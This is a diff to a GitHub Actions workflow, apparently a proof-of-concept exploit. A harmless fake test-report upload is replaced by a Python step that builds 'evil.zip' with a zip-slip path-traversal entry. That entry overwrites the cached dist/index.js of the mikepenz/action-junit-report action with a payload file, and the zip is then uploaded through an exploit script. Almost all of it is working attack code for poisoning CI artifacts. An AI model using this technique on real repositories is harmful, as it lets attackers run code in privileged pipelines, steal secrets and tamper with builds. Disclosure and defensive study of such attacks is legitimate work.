@@ -7,20 +7,16 @@ jobs:
     permissions:
       contents: read
     steps:
-      - name: Attacker controlled test report
+      - name: Craft malicious artifact (zip-slip -> junit action dist/index.js)
         run: |
-          mkdir -p surefire-reports
-          cat > surefire-reports/TEST-fake.xml <<'XML'
-          <?xml version="1.0" encoding="UTF-8"?>
-          <testsuite name="FakeSuite" tests="1" failures="0" errors="0" skipped="0" time="0.01">
-            <testcase name="totally_passing" classname="com.example.Fake" time="0.01"/>
-          </testsuite>
-          XML
-          echo "attacker artifact content" > surefire-reports/note.txt
-      - name: Upload Unit Tests Report
-        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
-        with:
-          name: surefire-unit-test-results
-          path: |
-            **/surefire-reports/TEST-*.xml
-            **/surefire-reports/*.html
+          python3 - <<'PY'
+          import zipfile
+          target = "../../../_actions/mikepenz/action-junit-report/6ef3fdcfcd5f0b5d14df3e659ef19b8c6820f93d/dist/index.js"
+          payload = open('exploit/payload.mjs').read()
+          with zipfile.ZipFile('evil.zip', 'w', zipfile.ZIP_DEFLATED) as z:
+              z.writestr(target, payload)
+              z.writestr('surefire-reports/TEST-fake.xml', '<?xml version="1.0" encoding="UTF-8"?><testsuite name="Fake" tests="1" failures="0"><testcase name="ok" classname="a.B" time="0.01"/></testsuite>')
+          print(zipfile.ZipFile('evil.zip').namelist())
+          PY
+      - name: Upload artifact via results service with raw zip
+        run: node exploit/upload.mjs
